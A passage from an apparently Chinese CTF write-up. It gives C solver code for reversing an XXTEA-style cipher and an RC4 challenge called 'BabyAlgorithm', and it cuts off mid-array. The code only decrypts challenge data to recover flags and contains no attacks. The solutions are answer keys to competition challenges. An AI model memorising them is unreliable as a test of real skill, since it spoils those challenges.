&#123;<span class="number">0x19</span>, <span class="number">0x19</span>, <span class="number">0x8</span>, <span class="number">0x10</span>&#125;;</span><br><span class="line">    <span class="type">uint8_t</span> data[] = &#123;</span><br><span class="line">            <span class="number">0x82</span>, <span class="number">0x8a</span>, <span class="number">0xfa</span>, <span class="number">0x38</span>, <span class="number">0x80</span>,</span><br><span class="line">            <span class="number">0x13</span>, <span class="number">0x50</span>, <span class="number">0xd7</span>, <span class="number">0x9d</span>, <span class="number">0x96</span>,</span><br><span class="line">            <span class="number">0x40</span>, <span class="number">0xe</span>, <span class="number">0x20</span>, <span class="number">0x91</span>, <span class="number">0x16</span>,</span><br><span class="line">            <span class="number">0x4e</span>, <span class="number">0xab</span>, <span class="number">0x29</span>, <span class="number">0x3a</span>, <span class="number">0x71</span>,</span><br><span class="line">            <span class="number">0x3d</span>, <span class="number">0x39</span>, <span class="number">0xe5</span>, <span class="number">0x6c</span>, <span class="number">0x2e</span>,</span><br><span class="line">            <span class="number">0x75</span>, <span class="number">0x9d</span>, <span class="number">0xb6</span>, <span class="number">0xe6</span>, <span class="number">0x88</span>,</span><br><span class="line">            <span class="number">0x1a</span>, <span class="number">0x84</span>, <span class="number">0x59</span>, <span class="number">0xb4</span>, <span class="number">0x31</span>, <span class="number">0x6f</span></span><br><span class="line">    &#125;;</span><br><span class="line">    btea((<span class="type">uint32_t</span> *) data, <span class="number">-9</span>, k);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">36</span>; i += <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230807114835421.png" alt="image-20230807114835421" style="zoom:33%;" /><p>结束…</p><h2 id="babyalgorithm">BabyAlgorithm</h2><p>这个题没啥好说的,就是RC4,然后我非要自己写脚本…费老半天</p><p>按照顺序把S-box(key)之类的求出来就行</p><p>我的代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">uint8_t</span> *a, <span class="type">uint8_t</span> *b)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> temp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> key2_origin[] = &#123;</span><br><span class="line">        <span class="number">78</span>, <span class="number">196</span>, <span class="number">247</span>, <span class="number">104</span>, <span class="number">9</span>, <span class="number">38</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">146</span>,</span><br><span class="line">        <span class="number">45</span>, <span class="number">154</span>, <span class="number">26</span>, <span class="number">100</span>, <span class="number">176</span>, <span class="number">33</span>, <span class="number">164</span>, <span class="number">11</span>,</span><br><span class="line">        <span class="number">93</span>, <span class="number">162</span>, <span class="number">34</span>, <span class="number">74</span>, <span class="number">212</span>, <span class="number">27</span>, <span class="number">126</span>, <span class="number">251</span>,</span><br><span class="line">        <span class="number">118</span>, <span class="number">128</span>, <span class="number">85</span>, <span class="number">50</span>, <span class="number">39</span>, <span class="number">79</span>, <span class="number">29</span>, <span class="number">248</span>,</span><br><span class="line">        <span class="number">142</span>, <span class="number">136</span>, <span class="number">15</span>, <span class="number">90</span>, <span class="number">105</span>, <span class="number">230</span>, <span class="number">180</span>, <span class="number">47</span>,</span><br><span class="line">        <span class="number">156</span>, <span class="number">140</span>, <span class="number">137</span>, <span class="number">54</span>, <span class="number">17</span>, <span class="number">56</span>, <span class="number">141</span>, <span class="number">37</span>,</span><br><span class="line">        <span class="number">231</span>, <span class="number">205</span>, <span class="number">66</span>, <span class="number">135</span>, <span class="number">223</span>, <span class="number">120</span>, <span class="number">76</span>, <span class="number">95</span>,</span><br><span class="line">        <span class="number">159</span>, <span class="number">153</span>, <span class="number">163</span>, <span class="number">207</span>, <span class="number">161</span>, <span class="number">178</span>, <span class="number">208</span>, <span class="number">155</span>,</span><br><span class="line">        <span class="number">71</span>, <span class="number">106</span>, <span class="number">209</span>, <span class="number">188</span>, <span class="number">94</span>, <span class="number">133</span>, <span class="number">19</span>, <span class="number">89</span>,</span><br><span class="line">        <span class="number">30</span>, <span class="number">198</span>, <span class="number">44</span>, <span class="number">82</span>, <span class="number">182</span>, <span class="number">75</span>, <span class="number">101</span>, <span class="number">43</span>,</span><br><span class="line">        <span class="number">64</span>, <span class="number">170</span>, <span class="number">235</span>, <span class="number">150</span>, <span class="number">117</span>, <span class="number">65</span>, <span class="number">73</span>, <span class="number">240</span>,</span><br><span class="line">        <span class="number">16</span>, <span class="number">109</span>, <span class="number">244</span>, <span class="number">129</span>, <span class="number">222</span>, <span class="number">12</span>, <span class="number">171</span>, <span class="number">13</span>,</span><br><span class="line">        <span class="number">91</span>, <span class="number">195</span>, <span class="number">210</span>, <span class="number">229</span>, <span class="number">144</span>, <span class="number">192</span>, <span class="number">102</span>, <span class="number">41</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">148</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">32</span>, <span class="number">87</span>, <span class="number">152</span>, <span class="number">97</span>,</span><br><span class="line">        <span class="number">131</span>, <span class="number">143</span>, <span class="number">21</span>, <span class="number">174</span>, <span class="number">40</span>, <span class="number">239</span>, <span class="number">168</span>, <span class="number">57</span>,</span><br><span class="line">        <span class="number">215</span>, <span class="number">197</span>, <span class="number">42</span>, <span class="number">186</span>, <span class="number">236</span>, <span class="number">77</span>, <span class="number">147</span>, <span class="number">121</span>,</span><br><span class="line">        <span class="number">169</span>, <span class="number">252</span>, <span class="number">233</span>, <span class="number">187</span>, <span class="number">189</span>, <span class="number">175</span>, <span class="number">69</span>, <span class="number">232</span>,</span><br><span class="line">        <span class="number">221</span>, <span class="number">10</span>, <span class="number">220</span>, <span class="number">4</span>, <span class="number">200</span>, <span class="number">202</span>, <span class="number">226</span>, <span class="number">213</span>,</span><br><span class="line">        <span class="number">185</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">173</span>, <span class="number">167</span>, <span class="number">138</span>, <span class="number">108</span>, <span class="number">88</span>,</span><br><span class="line">        <span class="number">245</span>, <span class="number">238</span>, <span class="number">48</span>, <span class="number">255</span>, <span class="number">190</span>, <span class="number">127</span>, <span class="number">25</span>, <span class="number">86</span>,</span><br><span class="line">        <span class="number">84</span>, <span class="number">194</span>, <span class="number">243</span>, <span class="number">114</span>, <span class="number">191</span>, <span class="number">99</span>, <span class="number">23</span>, <span class="number">250</span>,</span><br><span class="line">        <span class="number">157</span>, <span class="number">119</span>, <span class="number">211</span>, <span class="number">145</span>, <span class="number">20</span>, <span class="number">53</span>, <span class="number">125</span>, <span class="number">24</span>,</span><br><span class="line">        <span class="number">183</span>, <span class="number">35</span>, <span class="number">139</span>, <span class="number">160</span>, <span class="number">218</span>, <span class="number">5</span>, <span class="number">123</span>, <span class="number">225</span>,</span><br><span class="line">        <span class="number">122</span>, <span class="number">166</span>, <span class="number">98</span>, <span class="number">113</span>, <span class="number">204</span>, <span class="number">216</span>, <span class="number">107</span>, <span class="number">158</span>,</span><br><span class="line">        <span class="number">246</span>, <span class="number">63</span>, <span class="number">31</span>, <span class="number">179</span>, <span class="number">46</span>, <span class="number">92</span>, <span class="number">18</span>, <span class="number">28</span>,</span><br><span class="line">        <span class="number">58</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">241</span>, <span class="number">103</span>, <span class="number">203</span>, <span class="number">172</span>, <span class="number">62</span>,</span><br><span class="line">        <span class="number">7</span>, <span class="number">116</span>, <span class="number">193</span>, <span class="number">134</span>, <span class="number">81</span>, <span class="number">199</span>, <span class="number">130</span>, <span class="number">206</span>,</span><br><span class="line">        <span class="number">67</span>, <span class="number">228</span>, <span class="number">227</span>, <span class="number">237</span>, <span class="number">83</span>, <span class="number">51</span>, <span class="number">22</span>, <span class="number">181</span>,</span><br><span class="line">        <span class="number">6</span>, <span class="number">55</span>, <span class="number">219</span>, <span class="number">201</span>, <span class="number">242</span>, <span class="number">132</span>, <span class="number">80</span>, <span class="number">149</span>,</span><br><span class="line">        <span class="number">165</span>, <span class="number">214</span>, <span class="number">70</span>, <span class="number">184</span>, <span class="number">253</span>, <span class="number">112</span>, <span class="number">96</span>, <span class="number">36</span>,</span><br><span class="line">        <span class="number">151</span>, <span class="number">110</span>, <span class="number">177</span>, <span class="number">60</span>, <span class="number">2</span>, <span class="number">234</span>, <span class="number">59</span>, <span class="number">52</span>,</span><br><span class="line">        <span class="number">254</span>, <span class="number">217</span>, <span class="number">249</span>, <span class="number">124</span>, <span class="number">224</span>, <span class="number">61</span>, <span class="number">49</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">uint8_t</span> key2[] = &#123;</span><br><span class="line">        <span class="number">78</span>, <span class="number">179</span>, <span class="number">98</span>, <span class="number">15</span>, <span class="number">54</span>, <span class="number">170</span>, <span class="number">109</span>, <span class="number">41</span>, <span class="number">217</span>, <span class="number">180</span>, <span class="number">246</span>, <span class="number">227</span>, <span class="number">208</span>, <span class="number">96</span>, <span class="number">11</span>, <span class="number">160</span>, <span class="number">81</span>, <span class="number">205</span>, <span class="number">134</span>, <span class="number">234</span>, <span class="number">212</span>, <span class="number">155</span>, <span class="number">141</span>, <span class="number">20</span>,</span><br><span class="line">        <span class="number">250</span>, <span class="number">79</span>, <span class="number">127</span>, <span class="number">177</span>, <span class="number">105</span>, <span class="number">82</span>, <span class="number">63</span>, <span class="number">22</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">253</span>, <span class="number">47</span>, <span class="number">125</span>, <span class="number">6</span>, <span class="number">18</span>, <span class="number">60</span>, <span class="number">117</span>, <span class="number">107</span>, <span class="number">44</span>, <span class="number">162</span>, <span class="number">83</span>, <span class="number">112</span>, <span class="number">56</span>, <span class="number">27</span>, <span class="number">37</span>,</span><br><span class="line">        <span class="number">231</span>, <span class="number">93</span>, <span class="number">66</span>, <span class="number">135</span>, <span class="number">223</span>, <span class="number">120</span>, <span class="number">76</span>, <span class="number">95</span>, <span class="number">159</span>, <span class="number">153</span>, <span class="number">163</span>, <span class="number">207</span>, <span class="number">161</span>, <span class="number">178</span>, <span class="number">100</span>, <span class="number">74</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">209</span>, <span class="number">188</span>, <span class="number">94</span>, <span class="number">133</span>, <span class="number">19</span>, <span class="number">89</span>,</span><br><span class="line">        <span class="number">30</span>, <span class="number">198</span>, <span class="number">140</span>, <span class="number">39</span>, <span class="number">182</span>, <span class="number">75</span>, <span class="number">101</span>, <span class="number">43</span>, <span class="number">64</span>, <span class="number">38</span>, <span class="number">235</span>, <span class="number">150</span>, <span class="number">104</span>, <span class="number">65</span>, <span class="number">73</span>, <span class="number">240</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">244</span>, <span class="number">129</span>, <span class="number">222</span>, <span class="number">12</span>, <span class="number">171</span>, <span class="number">13</span>, <span class="number">91</span>,</span><br><span class="line">        <span class="number">195</span>, <span class="number">210</span>, <span class="number">229</span>, <span class="number">142</span>, <span class="number">192</span>, <span class="number">102</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">148</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">32</span>, <span class="number">87</span>, <span class="number">152</span>, <span class="number">97</span>, <span class="number">131</span>, <span class="number">143</span>, <span class="number">21</span>, <span class="number">174</span>, <span class="number">40</span>, <span class="number">239</span>, <span class="number">168</span>, <span class="number">57</span>, <span class="number">215</span>,</span><br><span class="line">        <span class="number">197</span>, <span class="number">42</span>, <span class="number">186</span>, <span class="number">236</span>, <span class="number">77</span>, <span class="number">147</span>, <span class="number">121</span>, <span class="number">169</span>, <span class="number">252</span>, <span class="number">233</span>, <span class="number">187</span>, <span class="number">189</span>, <span class="number">175</span>, <span class="number">69</span>, <span class="number">232</span>, <span class="number">221</span>, <span class="number">10</span>, <span class="number">220</span>, <span class="number">4</span>, <span class="number">200</span>, <span class="number">202</span>, <span class="number">226</span>, <span class="number">213</span>,</span><br><span class="line">        <span class="number">185</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">173</span>, <span class="number">167</span>, <span class="number">138</span>, <span class="number">108</span>, <span class="number">88</span>, <span class="number">245</span>, <span class="number">238</span>, <span class="number">48</span>, <span class="number">255</span>, <span class="number">190</span>, <span class="number">128</span>, <span class="number">25</span>, <span class="number">86</span>, <span class="number">84</span>, <span class="number">194</span>, <span class="number">243</span>, <span class="number">114</span>, <span class="number">191</span>, <span class="number">99</span>, <span class="number">23</span>, <span class="number">251</span>,</span><br><span class="line">        <span class="number">157</span>, <span class="number">119</span>, <span class="number">211</span>, <span class="number">145</span>, <span class="number">126</span>, <span class="number">53</span>, <span class="number">90</span>, <span class="number">24</span>, <span class="number">183</span>, <span class="number">35</span>, <span class="number">139</span>, <span class="number">164</span>, <span class="number">218</span>, <span class="number">5</span>, <span class="number">123</span>, <span class="number">225</span>, <span class="number">122</span>, <span class="number">166</span>, <span class="number">247</span>, <span class="number">113</span>, <span class="number">204</span>, <span class="number">216</span>, <span class="number">156</span>,</span><br><span class="line">        <span class="number">158</span>, <span class="number">154</span>, <span class="number">118</span>, <span class="number">31</span>, <span class="number">196</span>, <span class="number">46</span>, <span class="number">92</span>, <span class="number">230</span>, <span class="number">28</span>, <span class="number">58</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">241</span>, <span class="number">103</span>, <span class="number">203</span>, <span class="number">172</span>, <span class="number">62</span>, <span class="number">7</span>, <span class="number">116</span>, <span class="number">193</span>, <span class="number">137</span>, <span class="number">33</span>, <span class="number">199</span>, <span class="number">248</span>,</span><br><span class="line">        <span class="number">206</span>, <span class="number">67</span>, <span class="number">228</span>, <span class="number">26</span>, <span class="number">237</span>, <span class="number">9</span>, <span class="number">51</span>, <span class="number">29</span>, <span class="number">181</span>, <span class="number">50</span>, <span class="number">55</span>, <span class="number">219</span>, <span class="number">201</span>, <span class="number">242</span>, <span class="number">132</span>, <span class="number">80</span>, <span class="number">149</span>, <span class="number">165</span>, <span class="number">214</span>, <span class="number">70</span>, <span class="number">184</span>, <span class="number">136</span>, <span class="number">17</span>, <span class="number">176</span>, <span class="number">36</span>,</span><br><span class="line">        <span class="number">151</span>, <span class="number">110</span>, <span class="number">85</span>, <span class="number">45</span>, <span class="number">2</span>, <span class="number">34</span>, <span class="number">59</span>, <span class="number">52</span>, <span class="number">254</span>, <span class="number">146</span>, <span class="number">249</span>, <span class="number">124</span>, <span class="number">224</span>, <span class="number">61</span>, <span class="number">49</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">uint8_t</span> s3[] = &#123;</span><br><span class="line">        <span class="number">198</span>, <span class="number">33</span>, <span class="number">202</span>, <span class="number">191</span>, <span class="number">81</span>, <span class="number">67</span>, <span class="number">55</span>, <span class="number">49</span>, <span class="number">117</span>, <span class="number">228</span>,</span><br><span class="line">        <span class="number">142</span>, <span class="number">192</span>, <span class="number">84</span>, <span class="number">111</span>, <span class="number">143</span>, <span class="number">238</span>, <span class="number">248</span>, <span class="number">90</span>, <span class="number">162</span>, <span class="number">193</span>,</span><br><span class="line">        <span class="number">235</span>, <span class="number">165</span>, <span class="number">52</span>, <span class="number">109</span>, <span class="number">113</span>, <span class="number">85</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">178</span>, <span class="number">168</span>,</span><br><span class="line">        <span class="number">47</span>, <span class="number">244</span>, <span class="number">81</span>, <span class="number">142</span>, <span class="number">12</span>, <span class="number">204</span>, <span class="number">51</span>, <span class="number">83</span>, <span class="number">49</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="number">64</span>, <span class="number">214</span>, <span class="number">202</span>, <span class="number">236</span>, <span class="number">212</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">45</span>;</span><br><span class="line">    <span class="type">uint8_t</span> s[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//v5,v6和key都需要提前跑一遍获取最后的状态,所以这个代码非常麻烦</span></span><br><span class="line">    <span class="type">int</span> v5 = <span class="number">45</span>;</span><br><span class="line">    <span class="type">int</span> v6 = <span class="number">238</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">45</span>; i &gt;= <span class="number">0</span>;) &#123;</span><br><span class="line">        --i;</span><br><span class="line">        s[i] = s3[i] ^ (key2[((<span class="type">int</span>)key2[v5] + key2[v6])%<span class="number">256</span>]);</span><br><span class="line">        swap(key2 + v5, key2 + v6);</span><br><span class="line">        v6 = (v6 - (<span class="type">int</span>) key2[v5] + <span class="number">256</span>) % <span class="number">256</span>;</span><br><span class="line">        v5 = (v5 - <span class="number">1</span>) &lt; <span class="number">0</span> ? <span class="number">255</span> : v5 - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    这里用来求循环的最终状态以反向执行</span></span><br><span class="line"><span class="comment">    int v5 = 0;</span></span><br><span class="line"><span class="comment">    int v6 = 0;</span></span><br><span class="line"><span class="comment">    int i = 0;</span></span><br><span class="line"><span class="comment">    while (i &lt; len) &#123;</span></span><br><span class="line"><span class="comment">        v5 = (v5 + 1) % 256;</span></span><br><span class="line"><span class="comment">        v6 = (v6 + key2_origin[v5]) % 256;</span></span><br><span class="line"><span class="comment">        swap(key2_origin + v5, key2_origin + v6);</span></span><br><span class="line"><span class="comment">        ++i;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;v5=%d,v6=%d\n&quot;, v5, v6);</span></span><br><span class="line"><span class="comment">    for (int i = 0; i &lt; 256; ++i) &#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;%d,&quot;, key2_origin[i]);</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">45</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, s[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是我们实际上知道RC4的加解密的过程是相同的…</p><p>所以代码实际上基本不用改…</p><p>正解代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">uint8_t</span> *a, <span class="type">uint8_t</span> *b)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> temp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> key2_origin[] = &#123;</span><br><span class="line">        <span class="number">78</span>, <span class="number">196</span>, <span class="number">247</span>, <span class="number">104</span>, <span class="number">9</span>, <span class="number">38</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">146</span>,</span><br><span class="line">        <span class="number">45</span>, <span class="number">154</span>, <span class="number">26</span>, <span class="number">100</span>, <span class="number">176</span>, <span class="number">33</span>, <span class="number">164</span>, <span class="number">11</span>,</span><br><span class="line">        <span class="number">93</span>, <span class="number">162</span>, <span class="number">34</span>, <span class="number">74</span>, <span class="number">212</span>, <span class="number">27</span>, <span class="number">126</span>, <span class="number">251</span>,</span><br><span class="line">        <span class="number">118</span>, <span class="number">128</span>, <span class="number">85</span>, <span class="number">50</span>, <span class="number">39</span>, <span class="number">79</span>, <span class="number">29</span>, <span class="number">248</span>,</span><br><span class="line">        <span class="number">142</span>, <span class="number">136</span>, <span class="number">15</span>, <span class="number">90</span>, <span class="number">105</span>, <span class="number">230</span>, <span class="number">180</span>, <span class="number">47</span>,</span><br><span class="line">        <span class="number">156</span>, <span class="number">140</span>, <span class="number">137</span>, <span class="number">54</span>, <span class="number">17</span>, <span class="number">56</span>, <span class="number">141</span>, <span class="number">37</span>,</span><br><span class="line">        <span class="number">231</span>, <span class="number">205</span>, <span class="number">66</span>, <span class="number">135</span>, <span class="number">223</span>, <span class="number">120</span>, <span class="number">76</span>, <span class="number">95</span>,</span><br><span class="line">        <span class="number">159</span>, <span class="number">153</span>, <span class="number">163</span>, <span class="number">207</span>, <span class="number">161</span>, <span class="number">178</span>, <span class="number">208</span>, <span class="number">155</span>,</span><br><span class="line">        <span class="number">71</span>, <span class="number">106</span>, <span class="number">209</span>, <span class="number">188</span>, <span class="number">94</span>, <span class="number">133</span>, <span class="number">19</span>, <span class="number">89</span>,</span><br><span class="line">        <span class="number">30</span>, <span class="number">198</span>, <span class="number">44</span>, <span class="number">82</span>, <span class="number">182</span>, <span class="number">75</span>, <span class="number">101</span>, <span class="number">43</span>,</span><br><span class="line">        <span class="number">64</span>, <span class="number">170</span>, <span class="number">235</span>, <span class="number">150</span>, <span class="number">117</span>, <span class="number">65</span>, <span class="number">73</span>, <span class="number">240</span>,</span><br><span class="line">        <span class="number">16</span>, <span class="number">109</span>, <span class="number">244</span>, <span class="number">129</span>, <span class="number">222</span>, <span class="number">12</span>, <span class="number">171</span>, <span class="number">13</span>,</span><br><span class="line">        <span class="number">91</span>, <span class="number">195</span>, <span class="number">210</span>, <span class="number">229</span>, <span class="number">144</span>, <span class="number">192</span>, <span class="number">102</span>, <span class="number">41</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">148</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">32</span>, <span class="number">87</span>, <span class="number">152</span>, <span class="number">97</span>,</span><br><span class="line">        <span class="number">131</span>, <span class="number">143</span>, <span class="number">21</span>, <span class="number">174</span>, <span class="number">40</span>, <span class="number">239</span>, <span class="number">168</span>, <span class="number">57</span>,</span><br><span class="line">        <span class="number">215</span>, <span class="number">197</span>, <span class="number">42</span>, <span class="number">186</span>, <span class="number">236</span>, <span class="number">77</span>, <span class="number">147</span>, <span class="number">121</span>,</span><br><span class="line">        <span class="number">169</span>, <span class="number">252</span>, <span class="number">233</span>, <span class="number">187</span>, <span class="number">189</span>, <span class="number">175</span>, <span class="number">69</span>, <span class="number">232</span>,</span><br><span class="line">        <span class="number">221</span>, <span class="number">10</span>, <span class="number">220</span>, <span class="number">4</span>, <span class="number">200</span>, <span class="number">202</span>, <span class="number">226</span>, <span class="number">213</span>,</span><br><span class="line">        <span class="number">185</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">173</span>, <span class="number">167</span>, <span class="number">138</span>, <span class="number">108</span>, <span class="number">88</span>,</span><br><span class="line">        <span class="number">245</span>, <span class="number">238</span>, <span class="number">48</span>, <span class="number">255</span>, <span class="number">190</span>, <span class="number">127</span>, <span class="number">25</span>, <span class="number">86</span>,</span><br><span class="line">        <span class="number">84</span>, <span class="number">194</span>, <span class="number">243</span>, <span class="number">114</span>, <span class="number">191</span>, <span class="number">99</span>, <span class="number">23</span>, <span class="number">250</span>,</span><br><span class="line">        <span class="number">157</span>, <span class="number">119</span>, <span class="number">211</span>, <span class="number">145</span>, <span class="number">20</span>, <span class="number">53</span>, <span class="number">125</span>, <span class="number">24</span>,</span><br><span class="line">        <span class="number">183</span>, <span class="number">35</span>, <span class="number">139</span>, <span class="number">160</span>, <span class="number">218</span>, <span class="number">5</span>, <span class="number">123</span>, <span class="number">225</span>,</span><br><span class="line">        <span class="number">122</span>, <span class="number">166</span>, <span class="number">98</span>, <span class="number">113</span>, <span class="number">204</span>, <span class="number">216</span>, <span class="number">107</span>, <span class="number">158</span>,</span><br><span class="line">        <span class="number">246</span>, <span class="number">63</span>, <span class="number">31</span>, <span class="number">179</span>, <span class="number">46</span>, <span class="number">92</span>, <span class="number">18</span>, <span class="number">28</span>,</span><br><span class="line">        <span class="number">58</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">241</span>, <span class="number">103</span>, <span class="number">203</span>, <span class="number">172</span>, <span class="number">62</span>,</span><br><span class="line">        <span class="number">7</span>, <span class="number">116</span>, <span class="number">193</span>, <span class="number">134</span>, <span class="number">81</span>, <span class="number">199</span>, <span class="number">130</span>, <span class="number">206</span>,</span><br><span class="line">        <span class="number">67</span>, <span class="number">228</span>, <span class="number">227</span>, <span class="number">237</span>, <span class="number">83</span>, <span class="number">51</span>, <span class="number">22</span>, <span class="number">181</span>,</span><br><span class="line">        <span class="number">6</span>, <span class="number">55</span>, <span class="number">219</span>, <span class="number">201</span>, <span class="number">242</span>, <span class="number">132</span>, <span class="number">80</span>, <span class="number">149</span>,</span><br><span class="line">        <span class="number">165</span>, <span class="number">214</span>, <span class="number">70</span>, <span class="number">184</span>, <span class="number">253</span>, <span class="number">112</span>, <span class="number">96</span>, <span class="number">36</span>,</span><br><span class="line">        <span 